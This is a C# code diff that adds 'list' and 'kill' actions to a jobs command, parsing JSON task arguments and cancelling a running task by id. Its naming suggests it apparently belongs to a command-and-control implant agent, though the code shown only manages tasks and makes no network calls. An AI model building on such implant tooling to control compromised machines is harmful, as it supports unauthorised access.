@@ -17,17 +17,76 @@ namespace Workflow
         public async Task Execute(ServerJob job)
         {
             DebugLog.Log($"Executing {Name} [{job.task.id}]");
-            Dictionary<string, ServerJob> jobs = messageManager.GetJobs();
-            DebugLog.Log($"{Name} found {jobs.Count} active jobs [{job.task.id}]");
-            Dictionary<string, string> jobsOut = jobs.ToDictionary(j => j.Value.task.id, j => j.Value.task.command);
+            var args = JsonSerializer.Deserialize<jobs.JobsArgs>(
+                job.task.parameters);
 
-            messageManager.AddTaskResponse(new TaskResponse()
+            if (args is null)
             {
-                task_id = job.task.id,
-                user_output = JsonSerializer.Serialize(jobsOut),
-                completed = true
-            });
+                messageManager.AddTaskResponse(new TaskResponse
+                {
+                    completed = true,
+                    user_output = "Failed to deserialize arguments.",
+                    task_id = job.task.id,
+                    status = "error"
+                });
+                return;
+            }
+
+            try
+            {
+                string result = args.action switch
+                {
+                    "list" => ListJobs(job),
+                    "kill" => KillJob(args, job),
+                    _ => throw new ArgumentException(
+                        $"Unknown action: {args.action}")
+                };
+
+                messageManager.AddTaskResponse(new TaskResponse
+                {
+                    completed = true,
+                    user_output = result,
+                    task_id = job.task.id,
+                });
+            }
+            catch (Exception e)
+            {
+                messageManager.Write(
+                    e.ToString(), job.task.id, true, "error");
+            }
+
             DebugLog.Log($"{Name} completed [{job.task.id}]");
+        }
+
+        private string ListJobs(ServerJob job)
+        {
+            Dictionary<string, ServerJob> jobs =
+                messageManager.GetJobs();
+            DebugLog.Log(
+                $"{Name} found {jobs.Count} active jobs [{job.task.id}]");
+            var jobsOut = jobs.ToDictionary(
+                j => j.Value.task.id, j => j.Value.task.command);
+            return JsonSerializer.Serialize(jobsOut);
+        }
+
+        private string KillJob(jobs.JobsArgs args, ServerJob job)
+        {
+            if (string.IsNullOrEmpty(args.id))
+            {
+                return "No task id specified.";
+            }
+
+            if (!messageManager.TryGetJob(args.id, out ServerJob jobToKill))
+            {
+                DebugLog.Log(
+                    $"{Name} job '{args.id}' not found [{job.task.id}]");
+                return "Job not found.";
+            }
+
+            DebugLog.Log(
+                $"{Name} cancelling job '{args.id}' [{job.task.id}]");
+            jobToKill.cancellationtokensource.Cancel();
+            return "Cancellation request sent.";
         }
     }
 }
